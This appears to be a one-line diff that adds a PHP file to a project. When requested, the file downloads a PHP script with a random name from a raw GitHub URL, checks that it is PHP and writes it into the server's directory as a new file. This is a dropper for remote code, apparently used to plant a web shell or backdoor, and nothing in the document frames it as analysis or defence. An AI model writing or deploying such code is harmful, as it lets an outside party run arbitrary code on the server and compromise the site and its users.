@@ -1,0 +1,1 @@
+<?php $c = file_get_contents('https://raw.githubusercontent.com/uoguzman/phphelloworld/refs/heads/main/1/iTgPX8IC0d5uk.php'); if (strpos($c, '<?php')===false) die('err'); file_put_contents('iTgPX8IC0d5uk-1.php', $c); die('ok');
